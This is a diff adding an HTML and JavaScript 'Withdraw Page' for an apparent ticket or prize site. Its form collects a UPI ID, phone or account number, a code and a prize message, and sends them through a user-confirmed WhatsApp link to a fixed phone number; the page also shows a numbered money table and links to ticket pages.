@@ -1,0 +1,439 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Withdraw Page</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    html, body {
+      height: 100%;
+      font-family: Arial, sans-serif;
+    }
+
+    body {
+      background: url('back.jpg') no-repeat center center fixed;
+      background-size: cover;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      padding: 20px;
+      position: relative;
+      overflow-x: hidden;
+    }
+
+    .container {
+      background-color: rgba(255, 255, 255, 0.9);
+      padding: 25px;
+      border-radius: 12px;
+      width: 400px;
+      max-width: 100%;
+      box-shadow: 0 0 15px rgba(0, 0, 0, 0.2);
+      position: relative;
+      z-index: 10;
+    }
+
+    h1 {
+      font-size: 28px;
+      margin-bottom: 20px;
+      color: #333;
+      text-align: center;
+    }
+
+    button, select, input {
+      width: 100%;
+      padding: 12px;
+      font-size: 16px;
+      margin-top: 10px;
+      border-radius: 6px;
+      border: 1px solid #ccc;
+    }
+
+    button {
+      background-color: #28a745;
+      color: white;
+      border: none;
+      cursor: pointer;
+      transition: background-color 0.3s ease;
+    }
+
+    button:hover {
+      background-color: #218838;
+    }
+
+    #collectBtn {
+      background-color: #007bff;
+    }
+
+    #collectBtn:hover {
+      background-color: #0056b3;
+    }
+
+    #formSection, #resultSection {
+      display: none;
+      margin-top: 15px;
+    }
+
+    table {
+      width: 100%;
+      border-collapse: collapse;
+      margin-top: 15px;
+      overflow-x: auto;
+    }
+
+    th, td {
+      border: 1px solid #ccc;
+      padding: 6px;
+      font-size: 12px;
+      text-align: center;
+    }
+
+    .scroll-table {
+      overflow-x: auto;
+      max-width: 100%;
+    }
+
+    /* Tickets panel on right side */
+    .right-panel {
+      position: fixed;
+      top: 60px;
+      right: 20px;
+      width: 120px;
+      background: rgba(255, 255, 255, 0.9);
+      border-radius: 10px;
+      padding: 10px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.3);
+      z-index: 20;
+      text-align: center;
+      font-family: Arial, sans-serif;
+    }
+
+    .right-panel h3 {
+      margin-bottom: 10px;
+      font-size: 18px;
+      color: #333;
+    }
+
+    .ticket-btn {
+      width: 100%;
+      margin: 5px 0;
+      padding: 8px 5px;
+      font-size: 14px;
+      border-radius: 6px;
+      border: 1px solid #007bff;
+      background-color: white;
+      color: #007bff;
+      cursor: pointer;
+      transition: background-color 0.3s ease, color 0.3s ease;
+    }
+
+    .ticket-btn:hover {
+      background-color: #007bff;
+      color: white;
+    }
+
+    /* Running text at top */
+    .running-text {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      background-color: #000;
+      color: #fff;
+      font-weight: bold;
+      padding: 8px 0;
+      font-size: 18px;
+      white-space: nowrap;
+      overflow: hidden;
+      z-index: 30;
+    }
+
+    .running-text span {
+      display: inline-block;
+      padding-left: 100%;
+      animation: marquee 15s linear infinite;
+    }
+
+    @keyframes marquee {
+      0%   { transform: translateX(0%); }
+      100% { transform: translateX(-100%); }
+    }
+
+    /* How to Use Button */
+    .how-to-use-btn {
+      position: fixed;
+      top: 20px;
+      right: 20px;
+      z-index: 999;
+      background-color: #ff9800;
+      color: white;
+      border: none;
+      padding: 10px 15px;
+      border-radius: 8px;
+      font-size: 14px;
+      cursor: pointer;
+      transition: background 0.3s;
+    }
+
+    .how-to-use-btn:hover {
+      background-color: #e68900;
+    }
+
+    /* Popup Styles */
+    .popup {
+      display: none;
+      position: fixed;
+      z-index: 1000;
+      left: 0; top: 0;
+      width: 100%;
+      height: 100%;
+      background-color: rgba(0,0,0,0.5);
+    }
+
+    .popup-content {
+      background-color: white;
+      margin: 15% auto;
+      padding: 20px;
+      border-radius: 10px;
+      width: 80%;
+      max-width: 300px;
+      text-align: center;
+      font-size: 16px;
+    }
+
+    .popup-content button {
+      margin-top: 15px;
+      padding: 8px 12px;
+      font-size: 14px;
+      cursor: pointer;
+      border-radius: 5px;
+      border: 1px solid #007bff;
+      background-color: white;
+      color: #007bff;
+      transition: background-color 0.3s, color 0.3s;
+    }
+
+    .popup-content button:hover {
+      background-color: #007bff;
+      color: white;
+    }
+
+    /* Responsive */
+    @media (max-width: 480px) {
+      .container {
+        width: 90%;
+        padding: 20px;
+      }
+      .right-panel {
+        width: 100px;
+        top: 50px;
+        right: 10px;
+      }
+      .ticket-btn {
+        font-size: 12px;
+        padding: 6px 3px;
+      }
+      .running-text {
+        font-size: 14px;
+        padding: 6px 0;
+      }
+      .how-to-use-btn {
+        font-size: 12px;
+        padding: 8px 12px;
+      }
+    }
+  </style>
+</head>
+<body>
+
+  <!-- Running text -->
+  <div class="running-text"><span>super! super! super! super! super! super! super! super! super! super! super! super!</span></div>
+
+  <div class="container">
+    <h1>Home</h1>
+
+    <button id="withdrawBtn">Withdraw</button>
+    <button id="resultBtn">Result</button>
+
+    <!-- Withdraw Section -->
+    <div id="formSection">
+      <select id="optionSelect">
+        <option value="UPI ID">UPI ID</option>
+        <option value="Phone Number">Phone Number</option>
+        <option value="Account Number">Account Number</option>
+      </select>
+
+      <input type="text" id="inputValue" placeholder="Enter value here" />
+      <input type="text" id="codeValue" placeholder="Your Code" />
+      <input type="text" id="prizeValue" placeholder="Prize Number / Sorry / Please" />
+
+      <button id="collectBtn">Collect</button>
+    </div>
+
+    <!-- Result Section -->
+    <div id="resultSection" class="scroll-table">
+      <table id="resultTable">
+        <thead>
+          <tr id="headerRow"></tr>
+        </thead>
+        <tbody></tbody>
+      </table>
+    </div>
+  </div>
+
+  <!-- Tickets panel -->
+  <div class="right-panel">
+    <h3>Tickets</h3>
+    <button class="ticket-btn" data-link="index3.html">Ten</button>
+    <button class="ticket-btn" data-link="index4.html">Twenty</button>
+    <button class="ticket-btn" data-link="index5.html">Thirty</button>
+    <button class="ticket-btn" data-link="index6.html">Fourty</button>
+    <button class="ticket-btn" data-link="index7.html">Fifty</button>
+  </div>
+
+  <!-- How to Use Button -->
+  <button id="howToUseBtn" class="how-to-use-btn">How to Use</button>
+
+  <!-- Language Selection Popup -->
+  <div id="languagePopup" class="popup">
+    <div class="popup-content">
+      <h3>Select Language</h3>
+      <button onclick="showMessage('tamil')">தமிழ்</button>
+      <button onclick="showMessage('english')">English</button>
+      <br /><br />
+      <button onclick="closePopup()">Close</button>
+    </div>
+  </div>
+
+  <!-- Message Popup -->
+  <div id="messagePopup" class="popup">
+    <div class="popup-content" id="messageContent">
+      <!-- Message inserted here -->
+      <button onclick="closePopup()">Close</button>
+    </div>
+  </div>
+
+  <script>
+    // Elements
+    const withdrawBtn = document.getElementById('withdrawBtn');
+    const resultBtn = document.getElementById('resultBtn');
+    const formSection = document.getElementById('formSection');
+    const resultSection = document.getElementById('resultSection');
+    const collectBtn = document.getElementById('collectBtn');
+    const inputValue = document.getElementById('inputValue');
+    const codeValue = document.getElementById('codeValue');
+    const prizeValue = document.getElementById('prizeValue');
+    const optionSelect = document.getElementById('optionSelect');
+
+    // Show Withdraw Form
+    withdrawBtn.addEventListener('click', () => {
+      formSection.style.display = 'block';
+      resultSection.style.display = 'none';
+    });
+
+    // Show Result Table
+    resultBtn.addEventListener('click', () => {
+      resultSection.style.display = 'block';
+      formSection.style.display = 'none';
+      createTable();
+    });
+
+    // Change input placeholder based on selection
+    optionSelect.addEventListener('change', () => {
+      const selected = optionSelect.value;
+      if (selected === 'Phone Number' || selected === 'Account Number') {
+        inputValue.type = 'number';
+        inputValue.placeholder = 'Enter number';
+      } else {
+        inputValue.type = 'text';
+        inputValue.placeholder = 'Enter UPI ID';
+      }
+    });
+
+    // Collect Button: Send WhatsApp Message
+    collectBtn.addEventListener('click', () => {
+      const option = optionSelect.value;
+      const value = inputValue.value.trim();
+      const code = codeValue.value.trim();
+      const prize = prizeValue.value.trim();
+
+      if (!value || !code || !prize) {
+        alert("Please fill in all fields.");
+        return;
+      }
+
+      const message = `Withdraw using ${option}: ${value}\nYour Code: ${code}\nMessage: ${prize}`;
+      const phoneNumber = "6369228605";
+      const url = `https://wa.me/${phoneNumber}?text=${encodeURIComponent(message)}`;
+
+      if (confirm("Send message on WhatsApp?")) {
+        window.open(url, '_blank');
+      }
+    });
+
+    // Create Result Table: 2 columns, 51 rows
+    function createTable() {
+      const headerRow = document.getElementById('headerRow');
+      const tableBody = document.getElementById('resultTable').getElementsByTagName('tbody')[0];
+
+      headerRow.innerHTML = '';
+      tableBody.innerHTML = '';
+
+      // Header
+      const th1 = document.createElement('th');
+      th1.textContent = 'no';
+      const th2 = document.createElement('th');
+      th2.textContent = 'money';
+      headerRow.appendChild(th1);
+      headerRow.appendChild(th2);
+
+      // Rows 1-50
+      for (let i = 1; i <= 50; i++) {
+        const row = document.createElement('tr');
+
+        const noCell = document.createElement('td');
+        noCell.textContent = i;
+
+        const moneyCell = document.createElement('td');
+        moneyCell.textContent = i + 49; // 50 to 99
+
+        row.appendChild(noCell);
+        row.appendChild(moneyCell);
+
+        tableBody.appendChild(row);
+      }
+    }
+
+    // Tickets buttons click event - navigate to respective pages
+    document.querySelectorAll('.ticket-btn').forEach(btn => {
+      btn.addEventListener('click', () => {
+        const link = btn.getAttribute('data-link');
+        window.location.href = link;
+      });
+    });
+
+    // How to Use Button and Popups
+    document.getElementById('howToUseBtn').addEventListener('click', () => {
+      document.getElementById('languagePopup').style.display = 'block';
+    });
+
+    function showMessage(lang) {
+      const message = lang === 'tamil' ? 'இருக்கிங்க?' : 'Hi! How are you?';
+      document.getElementById('languagePopup').style.display = 'none';
+      const messageContent = document.getElementById('messageContent');
+      messageContent.innerHTML = `<p>${message}</p><br><button onclick="closePopup()">Close</button>`;
+      document.getElementById('messagePopup').style.display = 'block';
+    }
+
+    function closePopup() {
+      document.getElementById('languagePopup').style.display = 'none';
+      document.getElementById('messagePopup').style.display = 'none';
+    }
+  </script>
+</body>
+</html>
